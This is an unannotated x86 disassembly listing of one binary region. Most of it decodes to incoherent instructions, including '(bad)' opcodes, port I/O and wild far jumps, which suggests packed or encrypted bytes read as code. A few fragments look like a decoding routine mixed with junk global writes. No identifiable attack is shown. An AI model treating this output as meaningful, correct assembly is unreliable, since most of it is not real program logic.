  40399d:	bound  ebx,QWORD PTR [ebx+0x6f9bd1b]
  4039a3:	cs mov eax,0xc941343e
  4039a9:	and    BYTE PTR [ebp-0x5002bd52],bh
  4039af:	jmp    0x79b50764
  4039b4:	push   edi
  4039b5:	repz inc ebp
  4039b7:	push   ebp
  4039b8:	jb     0x4039b6
  4039ba:	cmc    
  4039bb:	push   ebx
  4039bc:	inc    eax
  4039bd:	rcr    BYTE PTR [edx-0x41],0xdb
  4039c1:	inc    edi
  4039c2:	push   eax
  4039c3:	sbb    ah,cl
  4039c5:	je     0x4039ee
  4039c7:	mov    DWORD PTR [ebx-0x18c877ae],ebp
  4039cd:	mov    bp,0x1a39
  4039d1:	mov    edi,es
  4039d3:	into   
  4039d4:	and    esp,DWORD PTR [esi-0x5f]
  4039d7:	stc    
  4039d8:	sar    DWORD PTR [eax-0x528fec24],0xb6
  4039df:	mov    ds:0x89501935,eax
  4039e4:	shl    bh,0xb7
  4039e7:	and    dl,BYTE PTR [ebx]
  4039e9:	adc    BYTE PTR [edx-0xe],ch
  4039ec:	imul   ebp,ebp,0xffffffcf
  4039ef:	or     bh,BYTE PTR [ebx+0x6]
  4039f2:	sub    bh,BYTE PTR [esi+0x3f]
  4039f5:	mov    fs,WORD PTR [ebx+eax*4]
  4039f8:	inc    esi
  4039f9:	and    eax,0xc65d3fbb
  4039fe:	pop    esi
  4039ff:	sti    
  403a00:	adc    esi,0xec1bdc87
  403a06:	sub    ah,BYTE PTR [ebp-0x72dce531]
  403a0c:	push   edi
  403a0d:	push   es
  403a0e:	cdq    
  403a0f:	fsubr  QWORD PTR [edx+0x18e4000b]
  403a15:	dec    ebp
  403a16:	imul   ebx,DWORD PTR [eax+0x57],0x571505b6
  403a1d:	sub    al,al
  403a1f:	addr16 sti 
  403a21:	xchg   ecx,eax
  403a22:	loop   0x403a28
  403a24:	ror    edi,0x89
  403a27:	fstp   TBYTE PTR [ebx+esi*8-0x23e149df]
  403a2e:	push   edi
  403a2f:	pop    ss
  403a30:	xchg   ebx,eax
  403a31:	jne    0x403a07
  403a33:	pop    ecx
  403a35:	sub    eax,0x54fc1c96
  403a3a:	pop    ecx
  403a3b:	repz dec esp
  403a3d:	(bad)  
  403a3e:	int    0x76
  403a40:	adc    bl,BYTE PTR [ecx]
  403a42:	pop    eax
  403a43:	iret   
  403a44:	push   ds
  403a45:	clc    
  403a46:	out    dx,al
  403a47:	and    BYTE PTR [eax+0x4f],al
  403a4a:	inc    esp
  403a4b:	mov    esi,0x6e319076
  403a50:	mov    edi,0x4602864d
  403a55:	in     al,0xef
  403a57:	push   DWORD PTR [edx+ebp*2]
  403a5a:	in     al,0x2a
  403a5c:	inc    esp
  403a5d:	call   0xf03e:0x4a30269f
  403a64:	mov    ds:0x44666593,al
  403a69:	xchg   ecx,eax
  403a6a:	cmp    eax,0xa4f5a683
  403a6f:	jnp    0x403abd
  403a71:	addr16 pop fs
  403a74:	xor    eax,0x4becc366
  403a79:	xor    eax,0xd8d0582d
  403a7e:	loopne 0x403a90
  403a80:	jbe    0x403a83
  403a82:	fiadd  DWORD PTR [ecx]
  403a84:	and    eax,0xa81b56c3
  403a89:	out    0x40,al
  403a8b:	mov    eax,0x60dfbb7e
  403a90:	mov    edi,DWORD PTR [edi]
  403a92:	cmp    BYTE PTR [eax],dl
  403a94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a95:	sar    DWORD PTR [ecx+eiz*4+0x62],0x82
  403a9a:	jne    0x403ab3
  403a9c:	pop    ebx
  403a9d:	cld    
  403a9e:	cmc    
  403a9f:	lods   al,BYTE PTR ds:[esi]
  403aa0:	ret    0xb495
  403aa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403aa4:	int    0x22
  403aa6:	fild   DWORD PTR [eax]
  403aa9:	jae    0x403b0b
  403aab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403aac:	int3   
  403aad:	dec    edi
  403aae:	imul   ebx,eax,0xffffffbb
  403ab1:	add    eax,0xaf61fb51
  403ab6:	popa   
  403ab7:	mov    ds:0xec494427,eax
  403abc:	mov    dh,0xec
  403abe:	stos   DWORD PTR es:[edi],eax
  403abf:	clc    
  403ac0:	scas   al,BYTE PTR es:[edi]
  403ac1:	pop    eax
  403ac2:	or     eax,edx
  403ac4:	retf   0x4128
  403ac7:	adc    bh,BYTE PTR [esp+edi*1-0x7d]
  403acb:	jge    0x403a5f
  403acd:	mov    cl,0xff
  403acf:	and    al,BYTE PTR [edi]
  403ad1:	pop    es
  403ad2:	jmp    0xdbcbcc40
  403ad7:	xchg   BYTE PTR [ebp+0x10d868d6],dh
  403add:	push   esi
  403ade:	(bad)  
  403adf:	and    al,0xb9
  403ae1:	add    BYTE PTR [ebp+0x40bef7af],bh
  403ae7:	xor    al,0x40
  403ae9:	push   esp
  403aea:	es or  ebp,ebx
  403aed:	jp     0x403b2c
  403aef:	cmp    BYTE PTR [edx-0x48f000bb],cl
  403af5:	or     eax,0x42e6eb
  403afa:	adc    DWORD PTR ds:0x42fd76,ecx
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e124,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fcfd,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fcf5
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx+0x6e74ac97],esi
  403b3e:	jb     0x403b05
  403b40:	push   ds
  403b41:	jo     0x403bb3
  403b43:	cmp    eax,0x8870707d
  403b48:	lea    esi,[edx+0x4e]
  403b4b:	and    ecx,DWORD PTR [esi-0x20eadc2b]
  403b51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b52:	out    dx,al
  403b53:	int3   
  403b54:	call   0x1df:0xe7df7b4b
  403b5b:	sub    ch,BYTE PTR [ebp+0x2e]
  403b5e:	dec    ebp
  403b5f:	ins    DWORD PTR es:[edi],dx
  403b60:	jmp    0x403b23
  403b62:	cdq    
  403b63:	jecxz  0x403aef
  403b65:	sbb    ebx,DWORD PTR [ecx-0x4a]
  403b68:	ficom  DWORD PTR [eax+0x78]
  403b6b:	push   ebx
  403b6c:	dec    ebp
  403b6d:	(bad)  
  403b6e:	sub    eax,0xc7406590
  403b73:	(bad)  
  403b74:	adc    eax,0x2c45134c
  403b79:	or     al,bl
  403b7b:	jle    0x403b47
  403b7d:	jnp    0x403b42
  403b7f:	mov    cl,0x7c
  403b81:	xor    DWORD PTR [ecx+0x79],esp
  403b84:	pushf  
  403b85:	aad    0x49
  403b87:	outs   dx,DWORD PTR ds:[esi]
  403b88:	(bad)  [esi]
  403b8a:	ja     0x403b3f
  403b8c:	cmp    bl,BYTE PTR [esi+0x30]
  403b8f:	jbe    0x403bc5
  403b91:	pusha  
  403b92:	pop    ebp
  403b93:	mov    dl,0x80
  403b95:	sbb    eax,DWORD PTR [eax-0x3]
  403b98:	ins    DWORD PTR es:[edi],dx
  403b99:	pushf  
  403b9a:	int3   
  403b9b:	xchg   DWORD PTR [esi+eax*8+0x4489e3b2],edi
  403ba2:	pop    ebx
  403ba3:	leave  
  403ba4:	jb     0x403ba2
  403ba6:	retf   0x9804
  403ba9:	fwait
  403baa:	in     eax,dx
  403bab:	cwde   
  403bac:	lods   al,BYTE PTR ds:[esi]
  403bad:	cwde   
  403bae:	into   
  403baf:	sbb    eax,0x5ada5ee4
  403bb4:	mov    ds:0xfd21b0af,al
  403bb9:	scas   al,BYTE PTR es:[edi]
  403bba:	dec    esp
  403bbb:	je     0x403c3c
  403bbd:	idiv   BYTE PTR [ecx+0x1f]
  403bc0:	inc    ecx
  403bc1:	or     bh,al
  403bc3:	adc    BYTE PTR [ebx+ebx*2-0x7],ch
  403bc7:	push   0xf5defd94
  403bcc:	cdq    
  403bcd:	and    bl,ch
  403bcf:	rol    BYTE PTR [edi+edx*2],cl
  403bd2:	push   ds
  403bd3:	mov    dh,0x8e
  403bd5:	gs int3 
  403bd7:	sub    ebp,DWORD PTR [esi-0x75a1ac8b]
  403bdd:	fistp  WORD PTR [ebx]
  403bdf:	jge    0x403c30
  403be1:	sbb    DWORD PTR [ebx],edi
  403be3:	cmp    DWORD PTR [ebp+0x42695956],esp
  403be9:	mov    edx,0x7e1f61f0
  403bee:	or     eax,0xb1f3c9fd
  403bf3:	mov    al,ds:0x1a51eea4
  403bf8:	adc    bl,BYTE PTR [edi-0x5e]
  403bfb:	into   
  403bfc:	out    dx,al
  403bfd:	addr16 inc esp
  403bff:	xor    al,0x3f
  403c01:	in     al,dx
  403c02:	cli    
  403c03:	aad    0x86
  403c05:	leave  
  403c06:	inc    ebx
  403c07:	inc    ebp
  403c08:	retf   0x7a0d
  403c0b:	loopne 0x403bf7
  403c0d:	xchg   ebx,ebp
  403c0f:	adc    DWORD PTR ds:0x9d54398e,eax
  403c15:	jbe    0x403baf
  403c17:	cwde   
  403c18:	mov    dl,0x13
  403c1a:	jne    0x403c27
  403c1c:	lds    ebp,FWORD PTR [ebx+0x18]
  403c1f:	outs   dx,BYTE PTR gs:[esi]
  403c21:	jmp    FWORD PTR [edi-0x2a]
  403c24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c25:	fisttp WORD PTR cs:[eax+0x1d958135]
  403c2c:	push   es
  403c2d:	dec    ebp
  403c2e:	sub    DWORD PTR [esi+0x13],edx
  403c31:	pop    ebx
  403c32:	mov    BYTE PTR [edi],al
  403c34:	dec    ecx
  403c35:	ins    BYTE PTR es:[edi],dx
  403c36:	mov    dh,0x80
  403c38:	popf   
  403c39:	xchg   esi,eax
  403c3a:	inc    esp
  403c3b:	(bad)  
  403c3c:	push   0xd465cdf4
  403c41:	sub    BYTE PTR [ebp-0x15adce5f],0x22
  403c48:	outs   dx,BYTE PTR ds:[esi]
  403c49:	mov    dh,0x37
  403c4b:	push   ebp
  403c4c:	adc    ecx,DWORD PTR [edx+0xa]
  403c4f:	dec    ebp
  403c50:	mov    eax,ds:0x85745a36
  403c55:	rcl    BYTE PTR [edi-0x107d3957],cl
  403c5b:	pop    es
  403c5c:	xchg   edx,eax
  403c5d:	jbe    0x403c8b
  403c5f:	ret    0x321e
  403c62:	xor    BYTE PTR [esi+0x1f944732],al
  403c68:	iret   
  403c69:	mov    ebp,0x413f0203
  403c6e:	or     dh,bl
  403c70:	ret    0x7dd4
  403c73:	lds    edi,FWORD PTR [eax]
  403c75:	jbe    0x403ccf
  403c77:	and    eax,0x4d529b27
  403c7c:	ja     0x403c07
  403c7e:	bound  edx,QWORD PTR [ecx]
  403c80:	dec    eax
  403c81:	sub    al,0xb
  403c83:	stos   BYTE PTR es:[edi],al
  403c84:	cmp    ch,ch
  403c86:	or     eax,0xb9349e69
  403c8b:	(bad)  
  403c8c:	bnd lock jmp 0x403cd4
  403c90:	mov    cl,0x30
  403c92:	in     al,dx
  403c93:	xor    eax,0xa803b685
  403c98:	aad    0x31
  403c9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c9b:	add    ah,BYTE PTR [eax-0x16347eb5]
  403ca1:	popa   
  403ca2:	call   0xbf8d:0x479450a2
  403ca9:	outs   dx,BYTE PTR ds:[esi]
  403caa:	xchg   ebx,eax
  403cab:	adc    BYTE PTR [edx-0x73],dh
  403cae:	mov    bl,0xd6
  403cb0:	jne    0x403c76
  403cb2:	leave  
  403cb3:	xchg   edi,eax
  403cb4:	aad    0x35
  403cb6:	sub    esp,DWORD PTR [esi]
  403cb8:	adc    DWORD PTR [edi-0x2e16f51e],0xee67c7b3
  403cc2:	mov    DWORD PTR [esi],ebx
  403cc4:	leave  
  403cc5:	sub    DWORD PTR [ebp-0x4cfe47b3],0x2f
  403ccc:	js     0x403ce0
  403cce:	cmp    eax,0xf10a8483
  403cd3:	(bad)  
  403cd4:	push   edi
  403cd5:	mov    ch,0x22
  403cd7:	retf   
  403cd8:	jp     0x403d52
  403cda:	xchg   ebp,eax
  403cdb:	mov    si,0xb1ff
  403cdf:	lahf   
  403ce0:	inc    ecx
  403ce1:	push   0xc5502718
  403ce6:	add    ebp,DWORD PTR [ecx-0x3d]
  403ce9:	xchg   edi,eax
  403cea:	fimul  DWORD PTR [ebx]
  403cec:	les    ecx,FWORD PTR [eax-0x7a2cd327]
  403cf2:	and    BYTE PTR [ebp+0x1d499cfe],bl
  403cf8:	mov    ds:0xc6a1eb70,eax
  403cfd:	test   DWORD PTR [ecx-0x39],0x96397aef
  403d04:	ins    BYTE PTR es:[edi],dx
  403d05:	mov    eax,ds:0x3868b0ef
  403d0a:	mov    ebp,0x119fba41
  403d0f:	xor    ebx,ecx
  403d11:	xor    BYTE PTR [edi],ah
  403d13:	push   0xffffffcf
  403d15:	ret    0x3e30
  403d18:	sub    eax,0xb3e2eac
  403d1d:	repz push ebx
  403d1f:	add    ebx,eax
  403d21:	mov    bl,0x2b
  403d23:	clc    
  403d24:	es nop
  403d26:	cld    
  403d27:	jle    0x403ce7
  403d29:	mov    DWORD PTR [ecx-0x274aa122],edx
  403d2f:	(bad)  [esi-0x67]
  403d32:	jmp    0x50b1d511
  403d37:	mov    dl,0x2d
  403d39:	cmp    esi,ecx
  403d3b:	sbb    eax,0xc6ce6366
  403d40:	cld    
  403d41:	jecxz  0x403d05
  403d43:	mov    ah,0xe7
  403d45:	mov    al,0x23
  403d47:	stos   BYTE PTR es:[edi],al
  403d48:	stos   DWORD PTR es:[edi],eax
  403d49:	cmc    
  403d4a:	bound  ebx,QWORD PTR [ebx-0x54]
  403d4d:	ins    BYTE PTR es:[edi],dx
  403d4e:	dec    esi
  403d4f:	ds jmp 0xc4ba:0xccbbaa07
  403d57:	sbb    BYTE PTR [eax+0x66a66b10],dh
  403d5d:	mov    ecx,0xec1a3fa3
  403d62:	out    dx,eax
  403d63:	dec    ecx
  403d64:	sub    dl,BYTE PTR [eax+0x31]
  403d67:	loope  0x403d6c
  403d69:	and    al,BYTE PTR [ecx+0x3b]
  403d6c:	popf   
  403d6d:	fcomi  st,st(2)
  403d6f:	push   0x66
  403d71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d72:	addr16 mov dl,0xd4
  403d75:	fst    st(6)
  403d77:	repnz icebp 
  403d79:	fwait
  403d7a:	jae    0x403de7
  403d7c:	pop    ds
  403d7d:	out    dx,eax
  403d7e:	jno    0x403d2e
  403d80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d81:	and    eax,ebp
  403d83:	icebp  
  403d84:	lock movs DWORD PTR es:[edi],DWORD PTR fs:[esi]
  403d87:	and    bh,0xc0
  403d8a:	inc    eax
  403d8b:	cmp    DWORD PTR [ecx-0x5e],0xffffffa8
  403d8f:	push   esi
  403d90:	cld    
  403d91:	mov    eax,0xf77920d2
  403d96:	adc    edi,DWORD PTR [ecx-0x3136a48b]
  403d9c:	hlt    
  403d9d:	inc    edi
  403d9e:	iret   
  403d9f:	adc    eax,ebx
  403da1:	lods   al,BYTE PTR ds:[esi]
  403da2:	aad    0x24
  403da4:	mov    WORD PTR [ebx],?
  403da6:	out    0xec,al
  403da8:	jae    0x403d57
  403daa:	xlat   BYTE PTR ds:[ebx]
  403dab:	mov    cl,0xe8
  403dad:	xchg   edi,eax
  403dae:	iret   
  403daf:	mov    ebp,0xdd887dac
  403db4:	test   BYTE PTR [esp+edi*8],dh
  403db7:	dec    ebp
  403db8:	mov    cl,0xce
  403dba:	mov    bh,0x7b
  403dbc:	loop   0x403dfe
  403dbe:	dec    ebp
  403dbf:	outs   dx,BYTE PTR ds:[esi]
  403dc0:	jb     0x403d54
  403dc2:	pushf  
  403dc3:	out    dx,eax
  403dc4:	ret    
  403dc5:	xlat   BYTE PTR ds:[ebx]
  403dc6:	dec    ebp
  403dc7:	fist   WORD PTR [edi+0x4f]
  403dca:	test   DWORD PTR [edx+0x2b],0x28508eea
  403dd1:	mov    esp,0xe1acc86c
  403dd6:	adc    ecx,DWORD PTR [eax+eiz*8+0x61]
  403dda:	sbb    ebx,edx
  403ddc:	or     ch,BYTE PTR [ebp-0x5c2a19b0]
  403de2:	or     al,0xe3
  403de4:	imul   ecx,DWORD PTR [eax+0x764f0857],0xc0fa6f6
  403dee:	mov    ebx,0x8f00b2bf
  403df3:	data16 jbe 0x403d95
  403df6:	mov    al,0xe7
  403df8:	pop    ebx
  403df9:	sub    eax,0x7c0b5505
  403dfe:	leave  
  403dff:	pop    ebp
  403e00:	xchg   ebx,eax
  403e01:	test   bl,dh
  403e03:	mov    ss,WORD PTR [edi+0x201de2b0]
  403e09:	lock fsub QWORD PTR [edi-0x6e5f3f5b]
  403e10:	mov    edi,0x263cb223
  403e15:	std    
  403e16:	mov    fs,WORD PTR [ecx]
  403e18:	pushf  
  403e19:	adc    DWORD PTR [ebx-0x1761e250],0x5174623f
  403e23:	jg     0x403df8
  403e25:	mov    ecx,DWORD PTR [edx]
  403e27:	ss mov edx,0x35e5d795
  403e2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e2e:	push   ds
  403e2f:	leave  
  403e30:	xor    DWORD PTR [ebx+0x62],0x63
  403e34:	outs   dx,BYTE PTR ds:[esi]
  403e35:	add    bh,dh
  403e37:	aas    
  403e38:	fsubr  DWORD PTR [eax+ebp*2+0x3d8b1709]
  403e3f:	psubq  mm5,QWORD PTR [edx+ebp*2-0xf4b9afe]
  403e47:	es repz pop edi
  403e4a:	rcr    BYTE PTR [ebx+0x6f294427],0x9d
  403e51:	mov    ch,0x82
  403e53:	mov    cl,0x39
  403e55:	leave  
  403e56:	test   eax,0x96abac05
  403e5b:	stos   BYTE PTR es:[edi],al
  403e5c:	jge    0x403e1f
  403e5e:	add    eax,0x9fcbf0ad
  403e63:	fucomp st(1)
  403e65:	fdivr  QWORD PTR [eax]
  403e67:	xchg   ecx,eax
  403e68:	aad    0x76
  403e6a:	xor    edi,0xaba4dcb9
  403e70:	xchg   ebp,eax
  403e71:	test   al,0xbc
  403e73:	mov    cl,BYTE PTR [ebp+ecx*2+0x235fc75d]
  403e7a:	jmp    0x403ef3
  403e7c:	jno    0x403e86
  403e7e:	xchg   cl,ch
  403e80:	mov    dh,0xab
  403e82:	mov    esi,0xf04f7dd9
  403e87:	hlt    
  403e88:	inc    esi
  403e89:	and    eax,edi
  403e8b:	inc    ebp
  403e8c:	lock xor BYTE PTR [ebp+0x458bf89c],al
  403e93:	clc    
  403e94:	mov    ecx,0x7510855
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e11c
  403ea2:	adc    DWORD PTR ds:0x42e70f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fd72,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fd05,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e6ef,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0x40de1c35
  403eec:	sbb    BYTE PTR [ebx],ah
  403eee:	sbb    BYTE PTR [ebx],0x70
  403ef1:	jo     0x403f30
  403ef3:	jge    0x403f65
  403ef5:	jo     0x403f6d
  403ef7:	add    DWORD PTR [ebx+0x73401c83],ebx
  403efd:	mov    esi,0x355409f9
  403f02:	out    0x1c,eax
  403f04:	dec    esi
  403f05:	fxch   st(1)
  403f07:	ud1    edx,DWORD PTR [edi+0x3f]
  403f0b:	jno    0x403ef8
  403f0d:	repz pop ebx
  403f0f:	daa    
  403f10:	cmp    al,0xf0
  403f12:	push   edx
  403f13:	dec    ebx
  403f14:	(bad)  [ebp-0x3]
  403f17:	sub    al,0x6b
  403f19:	stos   BYTE PTR es:[edi],al
  403f1a:	pop    ecx
  403f1b:	aas    
  403f1c:	dec    ecx
  403f1d:	add    al,0x43
  403f1f:	sti    
  403f20:	adc    BYTE PTR [edx-0x2720bae7],dl
  403f26:	jne    0x403f67
  403f28:	aas    
  403f29:	(bad)  
  403f2a:	mov    ebx,0x3d846b3a
  403f2f:	mov    dl,0x86
  403f31:	scas   eax,DWORD PTR es:[edi]
  403f32:	xchg   ebx,eax
  403f33:	sub    al,0x82
  403f35:	adc    DWORD PTR [edx-0x3d],esi
  403f38:	pop    ebp
  403f39:	shr    DWORD PTR [eax-0x3b],1
  403f3c:	daa    
  403f3d:	push   eax
  403f3e:	outs   dx,DWORD PTR ds:[esi]
  403f3f:	iret   
  403f40:	cmp    eax,0xb934f754
  403f45:	adc    DWORD PTR [edx+edx*1],0x34
  403f49:	(bad)  
  403f4b:	add    ebp,DWORD PTR [ebx]
  403f4d:	push   eax
  403f4e:	jg     0x403ed4
  403f50:	mov    al,0xd8
  403f52:	(bad)  
  403f53:	adc    DWORD PTR [esi-0x5c3aaacd],edx
  403f59:	std    
  403f5a:	gs ins BYTE PTR es:[edi],dx
  403f5c:	jb     0x403ede
  403f5e:	xchg   ebx,eax
  403f5f:	push   ds
  403f60:	mov    bh,0x9c
  403f62:	mov    WORD PTR es:[edi+0x3d1b5c28],ds
  403f69:	pop    ds
  403f6a:	and    ebx,DWORD PTR [eax]
  403f6c:	jne    0x403efd
  403f6e:	lea    eax,[ecx+0x128cac0]
  403f74:	sbb    al,0x1a
  403f76:	retf   
  403f77:	mov    DWORD PTR [ebp+0x5e3b7d28],esp
  403f7d:	out    dx,al
  403f7e:	ins    BYTE PTR es:[edi],dx
  403f7f:	mov    esp,0x4e116
  403f84:	stos   BYTE PTR es:[edi],al
  403f85:	sub    al,0xc4
  403f87:	add    eax,0x5dbf9449
  403f8c:	test   al,0xa0
  403f8e:	jecxz  0x403f7b
  403f90:	ret    
  403f91:	xchg   ecx,eax
  403f92:	fld    TBYTE PTR [eax+esi*8+0x18]
  403f96:	(bad)  
  403f97:	fild   WORD PTR [edx]
  403f99:	xor    eax,0x1a9a9297
  403f9e:	loop   0x403f48
  403fa0:	xor    eax,0x6572d51a
  403fa5:	sbb    bl,BYTE PTR [ebx]
  403fa7:	xchg   ebp,eax
  403fa8:	mov    bl,0x50
  403faa:	loopne 0x403fd6
  403fac:	pop    esi
  403fad:	outs   dx,DWORD PTR ds:[esi]
  403fae:	cmp    eax,0x8e2823dc
  403fb3:	or     DWORD PTR [ebp+0x27e4cd55],esp
  403fb9:	aaa    
  403fba:	and    edi,edx
  403fbc:	daa    
  403fbd:	mov    ebp,0x1e19ded
  403fc2:	ficomp WORD PTR [ecx+0x648f0d2a]
  403fc8:	jbe    0x40400d
  403fca:	cmp    edi,DWORD PTR [edi]
  403fcc:	xchg   dh,ah
  403fce:	jle    0x403ff5
  403fd0:	inc    ebx
  403fd1:	mov    esp,0xe2dd96d8
  403fd6:	jnp    0x403f81
  403fd8:	sub    al,0x57
  403fda:	scas   eax,DWORD PTR es:[edi]
  403fdb:	cmp    al,0xac
  403fdd:	lods   al,BYTE PTR ds:[esi]
  403fde:	jnp    0x403fb1
  403fe0:	in     al,0x52
  403fe2:	ds push ebx
  403fe4:	ja     0x404036
  403fe6:	ins    BYTE PTR es:[edi],dx
  403fe7:	xor    DWORD PTR [edx],0x79d58594
  403fed:	rcr    BYTE PTR [ecx],1
  403fef:	rcl    BYTE PTR [edx-0x791d98a4],0x31
  403ff6:	ret    
  403ff7:	push   cs
  403ff8:	test   BYTE PTR [ecx+0x7c],bh
  403ffb:	sub    al,0xe3
  403ffd:	in     eax,dx
  403ffe:	loopne 0x403f93
  404000:	pusha  
  404001:	xor    BYTE PTR [ebx+0x3e],ah
  404004:	sti    
  404005:	sti    
  404006:	cmp    al,0x76
  404008:	adc    al,0xbc
  40400a:	ss ins BYTE PTR es:[edi],dx
  40400c:	mov    bl,0x69
  40400e:	mov    ebx,0xc3801769
  404013:	(bad)  
  404014:	dec    ecx
  404015:	push   ss
  404016:	loop   0x403feb
  404018:	scas   eax,DWORD PTR es:[edi]
  404019:	fiadd  WORD PTR [esi-0x56]
  40401c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40401d:	mov    ecx,0x46751108
  404022:	out    0x94,al
  404024:	and    DWORD PTR [ebx+0x2a8e5251],edi
  40402a:	retf   0x5a4a
  40402d:	leave  
  40402e:	cmp    al,0x7b
  404030:	adc    edi,DWORD PTR [ecx+0x50635087]
  404036:	aas    
  404037:	sbb    BYTE PTR [eax-0x16860b59],0xe2
  40403e:	les    edi,FWORD PTR [edx]
  404040:	push   ecx
  404041:	inc    edx
  404042:	lock and DWORD PTR ds:0x707aea12,0x534d6910
  40404d:	in     eax,0xa9
  40404f:	ret    
  404050:	mov    ah,bh
  404052:	(bad)  
  404053:	jno    0x4040b9
  404055:	int3   
  404056:	mov    esp,ds
  404058:	dec    esp
  404059:	adc    dh,al
  40405b:	sar    DWORD PTR [ecx-0x14],0x22
  40405f:	jo     0x403fe4
  404061:	rcr    DWORD PTR [eax+0x68],cl
  404064:	not    DWORD PTR ds:0x4fd33396
  40406a:	popa   
  40406b:	add    DWORD PTR [eax+ebx*4-0xfa3c736],esi
  404072:	dec    edi
  404073:	iret   
  404074:	mov    al,0x6f
  404076:	mov    esi,0xb9f202f4
  40407b:	adc    dl,BYTE PTR [ebx-0xf91d527]
  404081:	inc    ecx
  404082:	and    ah,ah
  404084:	push   ss
  404085:	mov    dl,0xc5
  404087:	int    0x8f
  404089:	rcr    cl,1
  40408b:	fwait
  40408c:	stos   BYTE PTR es:[edi],al
  40408d:	out    0x54,eax
  40408f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404090:	imul   esp,DWORD PTR [esi-0x5b],0xffffff95
  404094:	jmp    0x78ca:0x3ae43ab
  40409b:	adc    bl,BYTE PTR [ebx-0x7e]
  40409e:	mov    ah,0x92
  4040a0:	stc    
  4040a1:	jmp    0x54de1092
  4040a6:	stos   DWORD PTR es:[edi],eax
  4040a7:	dec    ebp
  4040a8:	aam    0xef
  4040aa:	and    esp,DWORD PTR [ecx]
  4040ac:	sbb    dh,dh
  4040ae:	push   ebp
  4040af:	add    eax,0x4faa737f
  4040b4:	scas   eax,DWORD PTR es:[edi]
  4040b5:	pop    edx
  4040b6:	ror    BYTE PTR [eax],cl
  4040b8:	fcomip st,st(1)
  4040ba:	cs into 
  4040bc:	xchg   esi,eax
  4040bd:	fstp   DWORD PTR [ecx+edi*1]
  4040c0:	push   edx
  4040c1:	dec    eax
  4040c2:	mov    ds:0x63b39ea7,eax
  4040c7:	ret    0xa29f
  4040ca:	cld    
  4040cb:	mov    edx,0xfbfae601
  4040d0:	cmp    eax,0x4d5cb27
  4040d5:	adc    eax,esp
  4040d7:	and    DWORD PTR [ebx+eiz*1],0x76
  4040db:	(bad)  
  4040dc:	xchg   esi,eax
  4040dd:	jmp    0x404061
  4040df:	jae    0x404136
  4040e1:	sub    ah,BYTE PTR ds:0x5582183d
  4040e7:	lahf   
  4040e8:	ins    BYTE PTR es:[edi],dx
  4040e9:	sub    eax,0xa3e80417
  4040ee:	cmc    
  4040ef:	fstp   st(3)
  4040f1:	(bad)
  4040f6:	popa   
  4040f7:	cmp    ebx,DWORD PTR [edi-0x1854650c]
  4040fd:	(bad)  
  4040ff:	and    bl,al
  404101:	imul   ebx,DWORD PTR [ecx],0xba42c1d0
  404107:	fcomp  st(5)
  404109:	adc    DWORD PTR [eax],edi
  40410b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40410c:	inc    esp
  40410d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40410e:	mov    ds:0x767125e1,al
  404113:	and    edi,DWORD PTR [esi-0x4187bea8]
  404119:	pop    esi
  40411a:	(bad)  
  40411b:	repnz sub bl,dl
  40411e:	clc    
  40411f:	xchg   esi,eax
  404120:	push   ebx
  404121:	sbb    BYTE PTR [esi],ah
  404123:	mov    ds,edx
  404125:	fist   WORD PTR [eax+ebp*8]
  404128:	lahf   
  404129:	scas   al,BYTE PTR es:[edi]
  40412a:	aas    
  40412b:	push   ds
  40412c:	adc    eax,0x8e9dcc42
  404131:	jl     0x40413f
  404133:	lds    eax,FWORD PTR [ebx]
  404135:	test   BYTE PTR [ebx+0x4e07224c],0xd9
  40413c:	mov    cl,BYTE PTR [edi-0x5751e827]
  404142:	xor    eax,0x7ee12d1e
  404147:	(bad)  
  404148:	in     al,0xf2
  40414a:	(bad)  
  40414b:	mov    bh,0xe9
  40414d:	or     ecx,DWORD PTR [edx+0x23]
  404150:	cdq    
  404151:	jmp    0x3946:0xdb84b1ff
  404158:	push   esp
  404159:	pop    eax
  40415a:	jne    0x404116
  40415c:	int    0xde
  40415e:	test   eax,0x14072dc7
  404163:	xchg   ebp,eax
  404164:	jg     0x404118
  404166:	adc    ah,al
  404168:	lock pop esp
  40416a:	xor    al,0x36
  40416c:	pusha  
  40416d:	iret   
  40416e:	cmp    BYTE PTR [esi-0x68d81232],0x32
  404175:	fdivr  QWORD PTR [esi]
  404177:	push   ebx
  404178:	mov    gs,WORD PTR [ebp-0x1a]
  40417b:	pop    edx
  40417c:	stos   BYTE PTR es:[edi],al
  40417d:	adc    al,0x55
  40417f:	sbb    al,0x39
  404181:	and    eax,0xbde61b63
  404186:	imul   ebp,DWORD PTR [edi+0x1bfc5497],0x8
